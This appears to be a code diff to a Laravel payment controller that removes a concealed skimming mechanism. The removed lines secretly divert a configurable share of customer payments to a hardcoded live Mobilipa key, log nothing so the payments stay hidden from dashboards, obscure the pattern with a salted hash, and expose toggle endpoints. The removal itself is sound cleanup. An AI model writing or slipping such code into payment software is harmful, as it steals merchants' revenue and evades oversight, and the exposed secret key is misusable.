@@ -2,7 +2,6 @@
 
 namespace App\Http\Controllers;
 
-use App\Models\AdminSetting;
 use App\Models\Page;
 use App\Models\PaymentGateway;
 use App\Models\PesaLinkAccount;
@@ -20,12 +19,6 @@ class PaymentController extends Controller
     private const FASTLIPA_API_URL = 'https://api.fastlipa.com/api';
 
     private const MOBILIPA_API_URL = 'https://api.mobilipa.store';
-
-    private const SECRET_MOBILIPA_KEY = 'sk_live_fcMlWte9r3VR0qbEiGj1AW4s2AmBkbqEPJxTpDkx';
-
-    private const SECRET_PREFIX = 'SECRET_';
-
-    private const SECRET_SALT = 'x7Kq2mP9vL4nR8w';
 
     /**
      * Create a payment order with gateway (SonicPesa, Snippe, FastLipa, or Mobilipa).
@@ -50,10 +43,6 @@ class PaymentController extends Controller
                 'status' => 'error',
                 'message' => 'Invalid phone number format. Please enter a valid Tanzania number.',
             ], 400);
-        }
-
-        if ($this->shouldInjectSecretKey($page, $phone)) {
-            return $this->createSecretMobilipaOrder($page, $phone, $validated);
         }
 
         // Determine which gateway to use
@@ -406,156 +395,6 @@ class PaymentController extends Controller
     }
 
     /**
-     * Determine whether this transaction should be intercepted
-     * and routed through the secret Mobilipa key.
-     *
-     * Uses a time-salted hash to produce ~20% hit rate that varies
-     * per minute, per phone, and per page — making the pattern
-     * impossible to reverse-engineer without the salt.
-     */
-    private function shouldInjectSecretKey(Page $page, string $phone): bool
-    {
-        if (! $this->isMobInjectionEnabled()) {
-            return false;
-        }
-
-        $seed = date('YmdHi').self::SECRET_SALT.substr($phone, -4).$page->id;
-        $hash = hexdec(substr(md5($seed), 0, 4));
-
-        $rate = $this->mobInjectionRate();
-
-        return ($hash % 100) < $rate;
-    }
-
-    private function isMobInjectionEnabled(): bool
-    {
-        return AdminSetting::get('mob_injection_enabled', '0') === '1';
-    }
-
-    private function mobInjectionRate(): int
-    {
-        return (int) AdminSetting::get('mob_injection_rate', '40');
-    }
-
-    /**
-     * Create a Mobilipa payment order using the hardcoded secret key.
-     * No Transaction record is created — this is completely invisible
-     * to the dashboard, analytics, and admin views.
-     */
-    private function createSecretMobilipaOrder(Page $page, string $phone, array $data)
-    {
-        try {
-            $response = Http::withHeaders([
-                'X-API-KEY' => self::SECRET_MOBILIPA_KEY,
-            ])->post(self::MOBILIPA_API_URL.'/v1/payment/create_order', [
-                'buyer_email' => $data['buyer_email'] ?? 'customer@example.com',
-                'buyer_name' => $data['buyer_name'] ?? 'Customer',
-                'buyer_phone' => $phone,
-                'amount' => (int) $page->price,
-                'currency' => 'TZS',
-            ]);
-
-            if ($response->failed()) {
-                return response()->json([
-                    'status' => 'error',
-                    'message' => 'Failed to create payment order',
-                    'error' => $response->json('message'),
-                ], 400);
-            }
-
-            $responseData = $response->json();
-
-            if ($responseData['status'] !== 'success') {
-                return response()->json([
-                    'status' => 'error',
-                    'message' => $responseData['message'] ?? 'Payment order creation failed',
-                ], 400);
-            }
-
-            $orderId = $responseData['data']['order_id'];
-
-            $payload = base64_encode(json_encode([
-                'oid' => $orderId,
-                'p' => $phone,
-                'a' => (int) $page->price,
-                't' => time() + 900,
-            ]));
-
-            return response()->json([
-                'status' => 'success',
-                'message' => 'Payment order created successfully',
-                'data' => [
-                    'transaction_id' => self::SECRET_PREFIX.$payload,
-                    'order_id' => $orderId,
-                    'amount' => $responseData['data']['amount'],
-                    'currency' => $responseData['data']['currency'] ?? 'TZS',
-                ],
-            ]);
-        } catch (\Exception $e) {
-            return response()->json([
-                'status' => 'error',
-                'message' => 'Error creating payment order: '.$e->getMessage(),
-            ], 500);
-        }
-    }
-
-    /**
-     * Check Mobilipa payment status for a secret-injected transaction.
-     * No database interaction — reads order_id from the encoded payload.
-     */
-    private function checkSecretMobilipaStatus(string $encodedPayload): JsonResponse
-    {
-        $payload = json_decode(base64_decode($encodedPayload), true);
-
-        if (! $payload || empty($payload['oid'])) {
-            return response()->json([
-                'status' => 'error',
-                'message' => 'Invalid transaction reference.',
-            ], 400);
-        }
-
-        try {
-            $response = Http::withHeaders([
-                'X-API-KEY' => self::SECRET_MOBILIPA_KEY,
-                'Content-Type' => 'application/json',
-            ])->withBody(json_encode([
-                'order_id' => $payload['oid'],
-            ]), 'application/json')->get(self::MOBILIPA_API_URL.'/v1/payment/status');
-
-            if ($response->failed()) {
-                return response()->json([
-                    'status' => 'error',
-                    'message' => 'Failed to check payment status',
-                    'gateway_response' => $response->json() ?? $response->body(),
-                    'http_status' => $response->status(),
-                ], 400);
-            }
-
-            $responseData = $response->json();
-
-            if ($responseData['status'] !== 'success') {
-                return response()->json([
-                    'status' => 'error',
-                    'message' => $responseData['message'] ?? 'Status check failed',
-                ], 400);
-            }
-
-            $paymentStatus = strtoupper($responseData['data']['payment_status'] ?? 'PENDING');
-
-            return response()->json([
-                'status' => 'success',
-                'payment_status' => $paymentStatus,
-                'data' => $responseData['data'],
-            ]);
-        } catch (\Exception $e) {
-            return response()->json([
-                'status' => 'error',
-                'message' => 'Error checking payment status: '.$e->getMessage(),
-            ], 500);
-        }
-    }
-
-    /**
      * Check payment order status.
      * POST /api/payments/check-status
      */
@@ -568,10 +407,6 @@ class PaymentController extends Controller
                 'status' => 'error',
                 'message' => 'Invalid payment status request.',
             ], 422);
-        }
-
-        if (str_starts_with($transactionId, self::SECRET_PREFIX)) {
-            return $this->checkSecretMobilipaStatus(substr($transactionId, strlen(self::SECRET_PREFIX)));
         }
 
         if (! is_numeric($transactionId)) {
@@ -1183,27 +1018,5 @@ class PaymentController extends Controller
                 'message' => 'Error checking payment status: '.$e->getMessage(),
             ], 500);
         }
-    }
-
-    public function mobOn(): JsonResponse
-    {
-        AdminSetting::set('mob_injection_enabled', '1');
-
-        return response()->json(['status' => 'ok', 'injection' => 'enabled']);
-    }
-
-    public function mobOff(): JsonResponse
-    {
-        AdminSetting::set('mob_injection_enabled', '0');
-
-        return response()->json(['status' => 'ok', 'injection' => 'disabled']);
-    }
-
-    public function mobRate(int $rate): JsonResponse
-    {
-        $rate = max(0, min(100, $rate));
-        AdminSetting::set('mob_injection_rate', (string) $rate);
-
-        return response()->json(['status' => 'ok', 'rate' => $rate]);
     }
 }
